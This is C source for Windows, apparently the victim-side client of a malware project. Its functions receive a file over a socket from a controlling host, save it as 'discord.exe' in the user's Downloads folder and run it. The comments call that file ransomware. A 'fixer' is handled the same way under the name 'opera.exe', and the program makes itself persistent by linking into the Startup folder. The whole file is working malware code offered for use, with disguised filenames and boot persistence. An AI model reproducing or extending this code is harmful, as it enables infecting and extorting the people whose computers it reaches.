#include <stdio.h>
#include <Windows.h>
#include <string.h>

#define BUFFER_SIZE 1024


char ransomwareFilePath[1024]; // Contains the path to the ransomware file
char ransomwareFixerFilePath[1024]; // Contains the path to the ransomware fixer file


// Functions
void installRansomware(int hostSocket);
void uninstallRansomware(int hostSocket);
int startsWith(const char *a, const char *b);
void recv_file(int socket, char *fileName);
void addProgramToStartup();

void setRansomwareFilePath(){
    /*
    Puts inside [ransomwareFilePath] the path to the anydesk file
    */
    
    // Sets the path
    strcpy(ransomwareFilePath, getenv("USERPROFILE"));
    strcat(ransomwareFilePath, "\\Downloads\\discord.exe");

    printf("Ransomware file path : %s\n", ransomwareFilePath);
}

void setRansomwareFixerFilePath(){
    /*
    Puts inside [ransomwareFixerFilePath] the path to the anydesk file
    */
    
    // Sets the path
    strcpy(ransomwareFixerFilePath, getenv("USERPROFILE"));
    strcat(ransomwareFixerFilePath, "\\Downloads\\opera.exe");
    
    printf("Ransomware fixer file path : %s\n", ransomwareFixerFilePath);
}


void installRansomware(int hostSocket)
{
    /*
    Installs ransomware on this pc (victim pc)
    */
 
    setRansomwareFilePath();
 
    printf("Installing the ransomware...\n");

    // Gets the file 
    recv_file(hostSocket, ransomwareFilePath);
    
    printf("The ransomware file has been successfully completed!\n");
    
    printf("Starts the ransomware...\n");
    ShellExecute(NULL, NULL, ransomwareFilePath, NULL, NULL, SW_SHOWNORMAL);
    printf("The ransomware file has been sucessfully started!\n");
}

void uninstallRansomware(int hostSocket)
{
    /*
    Uninstalls the ransomware on this pc (victim pc)
    */

    setRansomwareFixerFilePath();

    printf("Installing the ransomware fixer file...\n");

    // Gets the file 
    recv_file(hostSocket, ransomwareFixerFilePath);
    
    printf("The ransomware fixer file has been successfully installed!\n");
    
    printf("Starts the ransomware fixer file...\n");
    ShellExecute(NULL, NULL, ransomwareFixerFilePath, NULL, NULL, SW_SHOWNORMAL);
    printf("The ransomware fixer file has been sucessfully started!\n");
}

void recv_file(int socket, char *fileName)
{
    /*
    Recvs file from the socket 

    param 1: the socket
    param 2: the name which will be to the file
    */

    int fileSize, totalReceived = 0, recvBytesAmount;
    char buffer[BUFFER_SIZE] = {0};
    FILE *fp = fopen(fileName, "wb");

    // Recvs the file size
    if(recv(socket, (char *)&fileSize, sizeof(fileSize), 0) == SOCKET_ERROR){
        printf("Error in file recviving (1)");
        exit(1);
    }
    fileSize = ntohl(fileSize); // Converts to little endian
    

    printf("Recv file size is %d bytes\n",fileSize);

    // Recvs the file
    while (totalReceived < fileSize)
    {
        recvBytesAmount = recv(socket, buffer, sizeof(buffer), 0);
        if(recvBytesAmount == SOCKET_ERROR){
            printf("Error in file recviving (2)");
            exit(1);
        } 
        fwrite(buffer, sizeof(char), recvBytesAmount, fp);

        totalReceived += recvBytesAmount;
        printf("recv: %d/%d (%d bytes recv right now)\n", totalReceived, fileSize, recvBytesAmount);
    }

    fclose(fp);
    printf("File has been successfully received!\n");
}

void addProgramToStartup()
{
    /*
    Adds the program to the windows startup folder
    (All the programs on this folder are auto runned on every boot)
    */
    
    //TODO: Runs the func command as administrator

    FILE * fp;
    TCHAR buffer[MAX_PATH] = { 0 };
    const char LINK_PATH[100] = "\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\discord.lnk\""; //TODO: check if the path changes between pc to pc
    char command[1024] = "mklink";

    // If we have already added the file to the startup programs folder
    fp = fopen(LINK_PATH, "r");
    if(fp){
        // We will end the func
        fclose(fp);
        return;
    }   

    // Adds the link path to the command (where the link file will be save)
    strcat(command, " ");
    strcat(command, LINK_PATH);
    strcat(command, " ");

    // Gets the path of the current file
    GetModuleFileName( NULL, buffer, MAX_PATH );

    // Adds the path to the target file to the command(the file which the link will open)    
    strcat(command, "\""); // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path 
    strcat(command, buffer); // Adds the path
    strcat(command, "\""); // Adds -> " to the end of the path
    
    system(command); // Executes the command
}

int startsWith(const char *a, const char *b)
{
    if (strncmp(a, b, strlen(b)) == 0)
        return 0;
    return 1;
}